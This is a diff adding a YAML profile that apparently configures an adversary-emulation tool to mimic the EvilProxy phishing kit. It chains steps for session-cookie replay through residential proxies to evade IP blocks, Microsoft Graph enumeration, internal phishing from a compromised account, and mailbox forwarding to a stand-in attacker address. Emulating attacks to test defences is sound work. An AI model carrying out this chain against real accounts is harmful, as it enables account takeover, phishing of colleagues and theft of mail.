@@ -1,0 +1,34 @@
+rig: evilproxy
+display_name: "EvilProxy – Reverse Proxy AiTM Kit Profile"
+description: |
+  Emulates the EvilProxy AiTM kit. Kill chain:
+    1. Residential-proxy cookie replay (bypasses IP-based detection).
+    2. Graph enumeration to identify high-value targets.
+    3. Internal spearphishing from compromised account.
+    4. Mailbox forwarding for persistence.
+  EvilProxy uses Safari/Mac UA and residential proxy egress to evade
+  datacenter-IP blocks.
+ua_profile: evilproxy-safari-mac
+egress_profile: residential
+stop_on_error: true
+steps:
+  - atomic: T1539-residential-proxy-replay
+    test_name: "Cookie replay via residential proxy egress"
+    args:
+      resource: "https://graph.microsoft.com"
+
+  - atomic: T1087.004-graph-enumeration
+    test_name: "Enumerate users, groups, and roles via Microsoft Graph"
+    requires_token_from: T1539-residential-proxy-replay
+
+  - atomic: T1566.002-internal-phishing
+    test_name: "Send internal phishing email via Graph from compromised account"
+    requires_token_from: T1539-residential-proxy-replay
+    args:
+      email_subject: "Urgent Action Required: Verify Your Account"
+
+  - atomic: T1114.002-mailbox-forwarding
+    test_name: "Set SMTP forwarding on victim mailbox via ExchangeOnlineManagement"
+    requires_token_from: T1539-residential-proxy-replay
+    args:
+      forwarding_address: "lab-attacker@example.com"
